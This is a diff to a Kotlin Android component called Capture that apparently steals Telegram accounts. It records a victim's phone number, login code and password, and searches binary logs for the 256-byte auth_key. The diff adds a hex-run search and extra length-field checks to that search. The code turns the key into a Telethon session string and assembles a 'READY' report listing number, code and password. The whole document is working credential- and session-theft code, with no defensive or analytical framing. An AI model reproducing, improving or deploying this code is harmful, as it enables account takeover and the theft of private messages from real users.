@@ -20,13 +20,12 @@ object Capture {
     var strategy = ""
 
     private val AUTH_KEY = "auth_key".toByteArray(Charsets.US_ASCII)
+    private val LENS = intArrayOf(256, 260, 512, 516)
 
     fun save(ctx: Context) {
         ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE).edit()
-            .putString("phone", phone)
-            .putString("code", code)
-            .putString("password", password)
-            .putString("session", session)
+            .putString("phone", phone).putString("code", code)
+            .putString("password", password).putString("session", session)
             .apply()
     }
 
@@ -55,31 +54,47 @@ object Capture {
     }
 
     private fun parse(b: ByteArray): Boolean {
-        if (b.size < 16) return false
-        return scanLen(b) || scanDcKey(b) || scanAscii(b) || walkInflate(b)
+        if (b.size < 64) return false
+        return scanHexRun(b) || scanLen(b) || scanDcKey(b) || scanAscii(b) || walkInflate(b)
     }
 
-    // --- strategie 1 : <len 260 BE ou LE><dc 4 octets><256 octets> ---
+    // --- strategie 1 : run de >=512 caracteres hex = cle encodee ---
 
-    private fun scanLen(b: ByteArray): Boolean {
-        for (p in 0..b.size - 264) {
-            if (be32(b, p) != 260 && le32(b, p) != 260) continue
-            val vs = p + 4
-            val dc = dcOf(b, vs)
-            if (dc == 0) continue
-            val key = b.copyOfRange(vs + 4, vs + 260)
-            if (looksLikeKey(key)) { accept(dc, key, "len260"); return true }
-        }
-        for (p in 0..b.size - 260) {
-            if (be32(b, p) != 256 && le32(b, p) != 256) continue
-            val vs = p + 4
-            val key = b.copyOfRange(vs, vs + 256)
-            if (looksLikeKey(key)) { accept(2, key, "len256"); return true }
+    private fun scanHexRun(b: ByteArray): Boolean {
+        var i = 0
+        while (i < b.size) {
+            if (hexChar(b[i])) {
+                var j = i
+                while (j < b.size && hexChar(b[j])) j++
+                if (j - i >= 512) {
+                    val key = hexToBytes(b, i, 512)
+                    accept(dcNear(b, i), key, "hexrun@$i/${j - i}")
+                    return true
+                }
+                i = j
+            } else i++
         }
         return false
     }
 
-    // --- strategie 2 : <dc 4 octets><256 octets>, sans se fier a la longueur ---
+    // --- strategie 2 : champ de longueur 256/260/512/516, LE ou BE ---
+
+    private fun scanLen(b: ByteArray): Boolean {
+        for (l in LENS) {
+            if (b.size <= l + 4) continue
+            for (p in 0..b.size - l - 4) {
+                if (le32(b, p) != l && be32(b, p) != l) continue
+                val vs = p + 4
+                val v = b.copyOfRange(vs, vs + l)
+                val key = keyFrom(v) ?: continue
+                accept(dcFrom(v), key, "len$l")
+                return true
+            }
+        }
+        return false
+    }
+
+    // --- strategie 3 : <dc 4 octets><256 octets bruts> ---
 
     private fun scanDcKey(b: ByteArray): Boolean {
         for (p in 0..b.size - 260) {
@@ -91,7 +106,7 @@ object Capture {
         return false
     }
 
-    // --- strategie 3 : cle ASCII "auth_key<dc>" (anciennes versions) ---
+    // --- strategie 4 : cle ASCII "auth_key<dc>" ---
 
     private fun scanAscii(b: ByteArray): Boolean {
         var i = indexOf(b, AUTH_KEY, 0)
@@ -105,7 +120,7 @@ object Capture {
                 if (vl in 256..300 && vs + vl <= b.size) {
                     val v = b.copyOfRange(vs, vs + vl)
                     val key = v.copyOfRange(v.size - 256, v.size)
-                    val dc = if (v.size >= 260) dcOf(v, 0) else digits.toIntOrNull() ?: 0
+                    val dc = if (v.size >= 260) dcFrom(v) else digits.toIntOrNull() ?: 0
                     if (dc in 1..5 && looksLikeKey(key)) { accept(dc, key, "ascii"); return true }
                 }
             }
@@ -114,7 +129,7 @@ object Capture {
         return false
     }
 
-    // --- strategie 4 : parcours des entrees + zlib ---
+    // --- strategie 5 : parcours d'entrees + zlib ---
 
     private fun walkInflate(b: ByteArray): Boolean {
         var p = 8
@@ -124,30 +139,34 @@ object Capture {
             val name = String(b, p, kl, Charsets.US_ASCII); p += kl
             val vl = le32(b, p); p += 4
             if (vl <= 0 || p + vl > b.size) return false
-
-            val raw = b.copyOfRange(p, p + vl)
-            p += vl
+            val raw = b.copyOfRange(p, p + vl); p += vl
 
             val cand = if (raw.size in 256..300) raw else inflate(raw) ?: raw
-            if (cand.size in 256..300) {
-                val key = cand.copyOfRange(cand.size - 256, cand.size)
-                val dc = if (cand.size >= 260) dcOf(cand, 0) else trailing(name)
-                if (dc in 1..5 && looksLikeKey(key)) { accept(dc, key, "walk"); return true }
-            }
+            val key = keyFrom(cand)
+            if (key != null) { accept(dcFrom(cand), key, "walk"); return true }
 
             p += 4
-            if (p + 4 <= b.size) {
-                val nx = le32(b, p)
-                if (nx <= 0 || nx > 128) p += 4
-            }
+            if (p + 4 <= b.size && (le32(b, p) <= 0 || le32(b, p) > 128)) p += 4
         }
         return false
     }
 
-    private fun trailing(name: String): Int =
-        name.takeLastWhile { it.isDigit() }.toIntOrNull() ?: 0
+    // ---------- helpers ----------
 
-    /** Les 4 octets a `p` doivent coder un dc_id 1..5, LE (`dc 00 00 00`) ou BE (`00 00 00 dc`). */
+    /** Rend une cle de 256 octets depuis une valeur brute, hexadecimale, ou suffixee. */
+    private fun keyFrom(v: ByteArray): ByteArray? {
+        if (v.size >= 512 && allHex(v, 512)) return hexToBytes(v, 0, 512)
+        if (v.size == 256 && looksLikeKey(v)) return v
+        if (v.size > 256) {
+            val k = v.copyOfRange(v.size - 256, v.size)
+            if (looksLikeKey(k)) return k
+        }
+        return null
+    }
+
+    /** dc_id eventuel en tete de valeur (LE ou BE). */
+    private fun dcFrom(v: ByteArray): Int = if (v.size >= 4) dcOf(v, 0) else 0
+
     private fun dcOf(b: ByteArray, p: Int): Int {
         if (p + 4 > b.size) return 0
         val a = b[p].toInt() and 0xFF
@@ -157,6 +176,38 @@ object Capture {
             if (c in 1..5 && a == 0) return c
         }
         return 0
+    }
+
+    private fun dcNear(b: ByteArray, pos: Int): Int {
+        for (back in intArrayOf(4, 8, 12, 16)) {
+            val p = pos - back
+            if (p >= 0) { val d = dcOf(b, p); if (d != 0) return d }
+        }
+        for (p in maxOf(0, pos - 32) until pos) {
+            val d = dcOf(b, p); if (d != 0) return d
+        }
+        return 0
+    }
+
+    private fun hexChar(x: Byte): Boolean {
+        val c = x.toInt() and 0xFF
+        return (c in 0x30..0x39) || (c in 0x61..0x66) || (c in 0x41..0x46)
+    }
+
+    private fun allHex(b: ByteArray, len: Int): Boolean {
+        if (b.size < len) return false
+        for (i in 0 until len) if (!hexChar(b[i])) return false
+        return true
+    }
+
+    private fun hexToBytes(b: ByteArray, from: Int, len: Int): ByteArray {
+        val out = ByteArray(len / 2)
+        for (k in out.indices) {
+            val hi = Character.digit((b[from + 2 * k].toInt() and 0xFF).toChar(), 16)
+            val lo = Character.digit((b[from + 2 * k + 1].toInt() and 0xFF).toChar(), 16)
+            out[k] = (((hi shl 4) or lo) and 0xFF).toByte()
+        }
+        return out
     }
 
     private fun looksLikeKey(k: ByteArray): Boolean {
@@ -171,19 +222,16 @@ object Capture {
     }
 
     private fun inflate(src: ByteArray): ByteArray? = try {
-        val inf = Inflater()
-        inf.setInput(src)
-        val out = ByteArray(8192)
-        val n = inf.inflate(out)
-        inf.end()
+        val inf = Inflater(); inf.setInput(src)
+        val out = ByteArray(8192); val n = inf.inflate(out); inf.end()
         if (n > 0) out.copyOf(n) else null
     } catch (_: Exception) { null }
 
     private fun accept(dc: Int, key: ByteArray, how: String) {
         authKeyHex = key.joinToString("") { "%02x".format(it.toInt() and 0xFF) }
-        dcId = dc
+        dcId = if (dc in 1..5) dc else 0
         strategy = how
-        session = telethon(dc, key)
+        session = telethon(if (dc in 1..5) dc else 2, key)
     }
 
     private fun indexOf(h: ByteArray, n: ByteArray, from: Int): Int {
@@ -208,19 +256,13 @@ object Capture {
 
     private fun telethon(dc: Int, key: ByteArray): String {
         val ip = when (dc) {
-            1 -> "149.154.175.53"
-            2 -> "149.154.167.51"
-            3 -> "149.154.175.100"
-            4 -> "149.154.167.91"
-            5 -> "91.108.56.130"
-            else -> "149.154.167.51"
+            1 -> "149.154.175.53"; 2 -> "149.154.167.51"; 3 -> "149.154.175.100"
+            4 -> "149.154.167.91"; 5 -> "91.108.56.130"; else -> "149.154.167.51"
         }.split(".").map { it.toInt().toByte() }.toByteArray()
-
         val out = ByteArray(1 + 4 + 2 + 256)
         out[0] = dc.toByte()
         System.arraycopy(ip, 0, out, 1, 4)
-        out[5] = 0xBB.toByte()
-        out[6] = 0x01
+        out[5] = 0xBB.toByte(); out[6] = 0x01
         System.arraycopy(key, 0, out, 7, 256)
         return Base64.encodeToString(out, Base64.URL_SAFE or Base64.NO_WRAP or Base64.NO_PADDING)
     }
@@ -237,29 +279,33 @@ object Capture {
     private fun offs(b: ByteArray, v: Int, be: Boolean): String {
         val out = mutableListOf<Int>()
         var p = 0
-        while (p <= b.size - 4 && out.size < 5) {
+        while (p <= b.size - 4 && out.size < 4) {
             if ((if (be) be32(b, p) else le32(b, p)) == v) out.add(p)
             p++
         }
         return out.toString()
     }
 
-    private fun offsDc(b: ByteArray): String {
-        val out = mutableListOf<Int>()
-        var p = 0
-        while (p <= b.size - 260 && out.size < 5) {
-            if (dcOf(b, p) != 0 && looksLikeKey(b.copyOfRange(p + 4, p + 260))) out.add(p)
-            p++
+    private fun firstHexRun(b: ByteArray): Int {
+        var i = 0
+        while (i < b.size) {
+            if (hexChar(b[i])) {
+                var j = i
+                while (j < b.size && hexChar(b[j])) j++
+                if (j - i >= 512) return i
+                i = j
+            } else i++
         }
-        return out.toString()
+        return -1
     }
 
     fun diagnose(b: ByteArray): String = buildString {
         append("BINLOG size=${b.size}\n")
-        append("be260=${offs(b, 260, true)} le260=${offs(b, 260, false)}\n")
-        append("be256=${offs(b, 256, true)} le256=${offs(b, 256, false)}\n")
-        append("dckey=${offsDc(b)}\n")
-        append("head=${hex(b, 0, 160)}")
+        for (l in LENS) append("L$l le=${offs(b, l, false)} be=${offs(b, l, true)}\n")
+        val h = firstHexRun(b)
+        append("hexrun_at=$h\n")
+        if (h >= 0) append("avant=${hex(b, maxOf(0, h - 40), 40)}\n")
+        append("head=${hex(b, 0, 96)}")
     }
 
     // ---------- sessions actives ----------
@@ -281,9 +327,7 @@ object Capture {
 
     fun payload(ctx: Context) = buildString {
         append("READY\n")
-        append("num: $phone\n")
-        append("code: $code\n")
-        append("pass: $password\n")
+        append("num: $phone\n"); append("code: $code\n"); append("pass: $password\n")
         append("user: $userId $userName\n")
         append("dc: $dcId\n")
         append("strat: $strategy\n")
